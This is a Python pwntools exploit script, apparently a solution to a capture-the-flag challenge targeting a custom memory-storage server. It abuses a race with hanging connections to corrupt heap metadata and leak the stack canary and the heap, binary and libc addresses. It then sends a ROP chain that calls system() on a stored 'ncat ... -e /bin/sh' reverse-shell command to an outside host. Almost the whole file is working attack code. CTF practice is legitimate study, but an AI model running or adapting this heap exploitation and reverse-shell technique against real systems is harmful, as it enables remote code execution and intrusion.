from pwn import *
from threading import Thread, current_thread, Lock
from time import sleep
from struct import unpack_from

from Crypto.Cipher import AES

elf = ELF("./patched/GS_memory_server_patched", checksec=False)
libc = ELF("./patched/libc.so.6", checksec=False)

CMD_RAM_COMPANY_INFO    = 0x0
CMD_RAM_ALLOC           = 0x1
CMD_RAM_FREE            = 0x2
CMD_RAM_READ            = 0x3
CMD_RAM_WRITE           = 0x4
CMD_RAM_CLEAR           = 0x5
CMD_RAM_AVAILABLE       = 0x6
CMD_RAM_DEFRAGMENT      = 0x7

ERR_INVALID_CMD         = 0xC0000001
ERR_INVALID_SIZE        = 0xC0000002
ERR_NO_SPACE_LEFT       = 0xC0000003
ERR_ENTRY_NOT_FOUND     = 0xC0000004
ERR_INVALID_PACKET      = 0xC0000005
ERR_MAX_ID              = 0xC0000006
ERR_CHECKSUM            = 0xC0000007
ERR_INVALID_ENC_SIZE    = 0xC0000008

create_lock = Lock()
remove_lock = Lock()

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1337
    REMOTE_HOST = "instances.challenge-ecw.fr"
    REMOTE_PORT = 42596
    
    def __init__(self) -> None:
        if args.REMOTE:
            self.io = remote(self.REMOTE_HOST, self.REMOTE_PORT)
        elif args.LOCAL:
            self.io = remote(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            print("[!] No args found")
            exit()

    def send_command(self, command: int):
        buf = p32(command)
        self.io.send(buf)
    
    def recv_msg(self):
        msg_size = u32(self.io.recv(4))
        msg = self.io.recv(msg_size)
        return msg

    def cmd_ram_company_info(self):
        self.send_command(CMD_RAM_COMPANY_INFO)
        name = self.recv_msg()
        mail = self.recv_msg()
        res = self.io.recv(4)
        return {"name": name, "mail": mail, "res": res}

    def cmd_ram_alloc(self, size: int, is_enc: bool):
        self.send_command(CMD_RAM_ALLOC)
        packet = p16(size) + p8(is_enc)
        create_lock.acquire()
        self.io.send(packet.ljust(4, b'\0'))
        res = u32(self.io.recv(4))
        if res == ERR_NO_SPACE_LEFT:
            print("Cannot create data, full storage.")
        if res == ERR_INVALID_SIZE:
            print("Packet size too big.")
            return -1
        id = u32(self.io.recv(4))
        create_lock.release()
        return id

    def cmd_ram_read(self, id: int):
        self.send_command(CMD_RAM_READ)
        packet = p32(id)
        self.io.send(packet)
        res = u32(self.io.recv(4))
        if res == ERR_ENTRY_NOT_FOUND:
            print("[CMD_RAM_READ]: data don't exists")
        if res == ERR_CHECKSUM:
            print("[CMD_RAM_READ]: wrong checksum")
        if res == 0:
            nbytes = u16(self.io.recv(2))
            data = self.io.recv(nbytes)
            return data

    def cmd_ram_write(self, id: int, data: bytes, hang: bool = False):
        self.send_command(CMD_RAM_WRITE)
        packet = p32(id) + p16(len(data))
        self.io.send(packet.ljust(8, b'\0'))
        if hang:
            return
        self.io.send(data)
        res = u32(self.io.recv(4))
        if res != 0:
            print("Failed storing data (err: %#x)" % res)

    def cmd_ram_clear(self):
        self.send_command(CMD_RAM_CLEAR)
        res = u32(self.io.recv(4))
        return res

    def cmd_ram_available(self):
        self.send_command(CMD_RAM_AVAILABLE)
        self.io.recv(4)
        res = u32(self.io.recv(4))
        return res

    def cmd_ram_defragment(self):
        self.send_command(CMD_RAM_DEFRAGMENT)
        res = self.io.recv(4)
        return res

    def cmd_ram_free(self, id: int):
        self.send_command(CMD_RAM_FREE)
        remove_lock.acquire()
        self.io.send(p32(id))
        res = u32(self.io.recv(4))
        remove_lock.release()
        if res == ERR_ENTRY_NOT_FOUND:
            print("RAM entry (id: %d) doesn't exists." % id)
            return False
        elif res == 0:
            print("RAM entry (id: %d) deleted." % id)
            return True
    
    def send_after_hang(self, data: bytes):
        self.io.send(data)
        res = u32(self.io.recv(4))
        if res != 0:
            print("Failed storing data (err: %#x)" % res)

    def interactive(self):
        self.io.interactive()
    
    def close(self):
        self.io.close()

AES_KEY = b"TH3Gr3eNSh4rDk3y"

def encrypt(buf: bytes):
    return AES.new(AES_KEY, AES.MODE_CBC, iv=b'\0'*0x10).encrypt(buf)

def decrypt(buf: bytes):
    return AES.new(AES_KEY, AES.MODE_CBC, iv=b'\0'*0x10).decrypt(buf)

exp = Exploit()

cmd = b"ncat xx.xx.xx.xx 1337 -e /bin/sh\0"

cmd_id = exp.cmd_ram_alloc(len(cmd), False)
exp.cmd_ram_write(cmd_id, cmd)

for _ in range(0xd6):
    print(exp.cmd_ram_alloc(0x10, False))

a = exp.cmd_ram_alloc(0x10, True)         # overwrite b metadata
b = exp.cmd_ram_alloc(0x10, False)        # new to_fake so next iter will use this one
c = exp.cmd_ram_alloc(0x30, False)        # overlapped #1
d = exp.cmd_ram_alloc(0x30, True)         # overlapped #2
to_fake = exp.cmd_ram_alloc(0x100, False) # the size will be used in the hang

target = exp.cmd_ram_alloc(0x18, False)

def get_hang_conn(target_id: int, nb_hang: int):
    hang_conns = []

    for idx in range(nb_hang):
        hang_conns.append(Exploit())
        hang_conns[idx].cmd_ram_write(target_id, b'A'*0x100, hang=True)
    
    return hang_conns

CORRUPT_ID = 0x000000DB

hang_conns = get_hang_conn(CORRUPT_ID, 2)

print("hang threads created.")

# corrupt the id of b
exp.cmd_ram_write(a, bytes.fromhex("6637373737373737373737373737373737373737373737373737373737373737"))

payload = b""
payload += b"A"*0x10
# non encrypted block
payload += p16(0xd897)  # id_checksum
payload += p16(0x400)   # data_size
payload += p16(0x400)   # data_size_enc
payload += p16(0x0)     # pad
payload += p32(0xd9)    # id
payload = payload.ljust(0x4c)
# encrypted block
payload += p16(0x9786)  # id_checksum
payload += p16(0x1000)  # data_size
payload += p16(0x30)    # data_size_enc
payload += p16(0x0)     # pad
payload += p32(0xda)    # id

hang_conns.pop().send_after_hang(payload.ljust(0x100))

leak = exp.cmd_ram_read(d)

canary = unpack_from("<Q", leak, offset=0x208)[0]
elf.address = unpack_from("<Q", leak, offset=0x218)[0] - 0x282c
heap_base = unpack_from("<Q", leak, offset=0x248)[0] - 0x106c0
libc.address = unpack_from("<Q", leak, offset=0x338)[0] - 0x11f133

cmd_addr = heap_base + 0x2ac

print("canary    @ %#x" % canary)
print("heap_base @ %#x" % heap_base)
print("elf_base  @ %#x" % elf.address)
print("libc_base @ %#x" % libc.address)
print("cmd_addr  @ %#x" % cmd_addr)

payload = b""
payload += b"A"*0x10
# non encrypted block
payload += p16(0xd897)  # id_checksum
payload += p16(0x500)   # data_size
payload += p16(0x500)   # data_size_enc
payload += p16(0x0)     # pad
payload += p32(0xd9)    # id
payload = payload.ljust(0x4c)
# encrypted block
payload += p16(0x9786)  # id_checksum
payload += p16(0x1000)  # data_size
payload += p16(0x30)    # data_size_enc
payload += p16(0x0)     # pad
payload += p32(0xda)    # id

hang_conns.pop().send_after_hang(payload.ljust(0x100))

pop_rdi = lambda x : p64(elf.address + 0x0000000000002ba3) + p64(x) # pop rdi ; ret
ret = p64(elf.address + 0x000000000000101a) # ret

rp = b""
rp += b'A'*0x208
rp += p64(canary)
rp += b'A'*8
rp += ret
rp += pop_rdi(cmd_addr)
rp += p64(libc.symbols["system"])

exp.cmd_ram_write(c, rp)

exp.interactive()
exp.close()